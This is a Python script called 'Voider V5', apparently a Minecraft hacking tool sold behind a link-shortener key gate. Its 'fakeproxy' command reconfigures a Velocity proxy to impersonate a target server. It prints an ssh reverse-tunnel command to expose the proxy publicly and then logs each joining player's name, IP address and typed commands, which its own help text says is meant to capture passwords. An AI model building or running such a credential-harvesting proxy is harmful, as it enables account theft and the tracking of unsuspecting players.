import re
import subprocess
import time
import shutil
import socket
import os
import sys
from mcstatus import JavaServer

# ANSI Color Codes (Hacker-style)
AQUA = "\033[96m"
BLUE = "\033[94m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Cool banner (AQUA for large text)
banner = f"""
{BOLD}{AQUA}          
 __      __   _     _            __      ________ 
 \ \    / /  (_)   | |           \ \    / /____  |
  \ \  / /__  _  __| | ___ _ __   \ \  / /    / / 
   \ \/ / _ \| |/ _` |/ _ \ '__|   \ \/ /    / /  
    \  / (_) | | (_| |  __/ |       \  /    / /   
     \/ \___/|_|\__,_|\___|_|        \/    /_/    
                                                  
                                                  
                                                        
{RESET}{CYAN}Hi, This Is {BOLD}Voider V5{RESET}{CYAN} By {BOLD}PengoWick{RESET}{CYAN} ({MAGENTA}LegendlyPenguin on YouTube{CYAN}), 
If You Downloaded It From {RED}AnyWhere Else{CYAN}, You Are Being {RED}Ratted{CYAN}!
If You Have Any Error, Contact Me On Discord:
{YELLOW}ID - {BOLD}LegendlyPenguin{RESET}
"""

AUTH_KEY = "asd123"  # The required authentication key

# Display banner
print(banner)
time.sleep(0.5)

# Show Linkpays prompt before key system
print(f"{YELLOW}[!] Before continuing, please solve this to unlock The Key!!!{RESET}")
print(f"{CYAN}Link: {BOLD}https://linkpays.in/vFNp5y{RESET}\n")
time.sleep(0.5)

# Authentication system
attempts = 3
while attempts > 0:
    key_input = input(f"{RED}VoiderV5{RESET}@{AQUA}Authentication{RESET}: Enter key: ").strip()
    if key_input == AUTH_KEY:
        print(f"{GREEN}[✔] Access granted!{RESET}")
        break
    else:
        attempts -= 1
        print(f"{RED}[-] Incorrect key! {attempts} attempts left.{RESET}")

    if attempts == 0:
        print(f"{RED}[X] Too many failed attempts. Exiting...{RESET}")
        exit(1)

# Help command
COMMANDS = {
    "fakeproxy": "Set up a fake proxy to redirect Minecraft traffic, and get user's password when they join",
    "server": "Get Minecraft server details (IP, Version, Players, etc.).",
    "help": "Display this help message."
}

def display_help():
    print(f"{AQUA}\nAvailable Commands:{RESET}")
    for cmd, desc in COMMANDS.items():
        print(f"{GREEN}{cmd}{RESET} - {desc}")

# Get numerical IP
def get_numerical_ip(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None
# Minecraft server lookup
def check_minecraft_server(server_address):
    print(f"\n{YELLOW}[#] Checking the server {GREEN}{server_address}{YELLOW}...{RESET}")
    
    numerical_ip = get_numerical_ip(server_address)
    if not numerical_ip:
        print(f"{RED}[-] Unable to resolve IP for {server_address}.{RESET}")
        return

    try:
        server = JavaServer.lookup(server_address)
        status = server.status()

        print(f"{AQUA}[IP]{RESET} {server_address} (Numerical: {numerical_ip})")
        print(f"{AQUA}[Version]{RESET} {status.version.name}")
        print(f"{AQUA}[Protocol]{RESET} {status.version.protocol}")
        print(f"{AQUA}[Players]{RESET} {status.players.online}/{status.players.max}")
        print(f"{AQUA}[Ping]{RESET} {server.ping()}ms")
    
    except Exception as e:
        print(f"{RED}[-] Failed to retrieve server info: {e}{RESET}")

# Main logic after authentication...
while True:
    user_input = input(f"\033[1;31mroot@voiderv5\033[0m:\033[1;34m~/PengoWick/\033[0m ► ").strip()

    if user_input == "help":
        display_help()
        continue

    elif user_input.startswith("server "):
        server_ip = user_input.split(" ")[1] if len(user_input.split(" ")) > 1 else None
        if server_ip:
            check_minecraft_server(server_ip)
        else:
            print(f"{RED}[-] Invalid command! Please use: server <server_ip>{RESET}")
        continue

    elif user_input.startswith("fakeproxy "):
        match = re.match(r"^fakeproxy\s+([a-zA-Z0-9.-]+)(?::(\d+))?$", user_input)
        if not match:
            print(f"{RED}[-] Invalid command! Please use: fakeproxy <IP>[:Port]{RESET}")
            continue

        server_ip = match.group(1)
        server_port = match.group(2) if match.group(2) else "25565"

        print(f"\n{YELLOW}[#] Setting up fake proxy for {GREEN}{server_ip}:{server_port}{YELLOW}...{RESET}")
        time.sleep(1)

        # Path to velocity.toml
        velocity_path = "velocity.toml"

        # Backup velocity.toml
        shutil.copy2(velocity_path, velocity_path + ".backup")
        print(f"{AQUA}[i] Backup created at {velocity_path}.backup{RESET}")

        # Path to velocity.toml
        velocity_path = "velocity.toml"

        # Backup velocity.toml
        shutil.copy2(velocity_path, velocity_path + ".backup")
        print(f"{AQUA}[i] Backup created at {velocity_path}.backup{RESET}")

        # Read and modify velocity.toml
        with open(velocity_path, "r", encoding="utf-8") as file:
            content = file.readlines()

        new_content = []
        inside_forced_hosts = False
        forced_host_written = False

        for line in content:
            stripped = line.strip()

            # Modify 'lobby =' under [servers]
            if stripped.startswith("lobby ="):
                new_content.append(f'    lobby = "{server_ip}"\n')
                continue

            # Detect [forced-hosts] section
            if stripped == "[forced-hosts]":
                inside_forced_hosts = True
                new_content.append(line)
                continue

            # Handle inside [forced-hosts]
            if inside_forced_hosts:
                if stripped.startswith("[") and stripped != "[forced-hosts]":
                    inside_forced_hosts = False
                    if not forced_host_written:
                        new_content.append(f'"{server_ip}" = [ "lobby",]\n')
                        forced_host_written = True
                    new_content.append(line)
                    continue

                # Skip old forced-host lines
                if re.match(r'^".*?"\s*=\s*\[\s*"lobby"\s*,?\s*\]', stripped):
                    continue

                new_content.append(line)
                continue

            new_content.append(line)

        if inside_forced_hosts and not forced_host_written:
            new_content.append(f'"{server_ip}" = [ "lobby",]\n')
            forced_host_written = True

        with open(velocity_path, "w", encoding="utf-8") as file:
            file.writelines(new_content)

        print(f"{GREEN}[+] velocity.toml successfully updated with new lobby and forced-host for {server_ip}.{RESET}")

        # Run Velocity
        print(f"{YELLOW}[+] Starting Velocity proxy...{RESET}")
        time.sleep(1)

        # Ask user how they want to access the proxy
        print(f"\n{AQUA}Select your connection mode:{RESET}")
        print(f"{BLUE}[1] Localhost (127.0.0.1:25564) - For testing on this machine{RESET}")
        print(f"{BLUE}[2] Public IP (Expose to the world){RESET}")

        choice = input(f"{GREEN}[>] Enter option (1/2): {RESET}").strip()

        if choice == "1":
            proxy_ip = "127.0.0.1:25564"
            print(f"{YELLOW}[+] Running on localhost... Connect using {GREEN}{proxy_ip}{RESET}")
        else:
            print(f"\n{AQUA}[!] Open another terminal and run this to expose your fakeproxy:{RESET}")
            print(f"{YELLOW}ssh -p 443 -R0:127.0.0.1:25564 tcp@a.pinggy.io{RESET}\n")
            
            ssh_output = input(f"{GREEN}[>] Paste the full SSH output link: {RESET}").strip()
            
            match = re.match(r"tcp://([^:]+):(\d+)", ssh_output)
            if not match:
                print(f"{RED}[-] Invalid input! Make sure you paste the full link.{RESET}")
                continue
            
            host = match.group(1)
            port = match.group(2)
            
            numerical_ip = get_numerical_ip(host)
            if not numerical_ip:
                print(f"{RED}[-] Error: Unable to resolve {host} to an IP!{RESET}")
                continue
            
            proxy_ip = f"{numerical_ip}:{port}"
            print(f"{GREEN}[✔] Public Proxy active: {proxy_ip}{RESET}")

        # Show logs from Velocity
        velocity_process = subprocess.Popen(
            ["java", "-jar", "Velocity.jar"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )

        try:
            while True:
                output = velocity_process.stdout.readline().strip()
                if output:
                    # Match for player connection
                    match_connect = re.search(r"\[connected player\] (.*?) \((.*?)\) has connected", output)
                    if match_connect:
                        player_name = match_connect.group(1)
                        ip_address = match_connect.group(2).split(":")[0]
                        print(f"{AQUA}{player_name} ({RED}{ip_address}{AQUA}) has entered the server.{RESET}")
                        continue

                    # Match for player disconnection
                    match_disconnect = re.search(r"\[connected player\] (.*?) \((.*?)\) has disconnected", output)
                    if match_disconnect:
                        player_name = match_disconnect.group(1)
                        ip_address = match_disconnect.group(2).split(":")[0]
                        print(f"{AQUA}{player_name} ({RED}{ip_address}{AQUA}) has left the server.{RESET}")
                        continue

                    # Match for command execution
                    match_command = re.search(r"\[connected player\] (.*?) \((.*?)\) -> executed command (.*)", output)
                    if match_command:
                        player_name = match_command.group(1)
                        ip_address = match_command.group(2).split(":")[0]
                        command = match_command.group(3)
                        print(f"{AQUA}{player_name} ({RED}{ip_address}{AQUA}) has executed: {GREEN}{command}{RESET}")
                        continue

        except KeyboardInterrupt:
            print(f"\n{RED}[!] Stopping the fake proxy...{RESET}")
            velocity_process.terminate()
            print(f"{GREEN}[✔] Fake proxy stopped. You can now run other commands.{RESET}")
            continue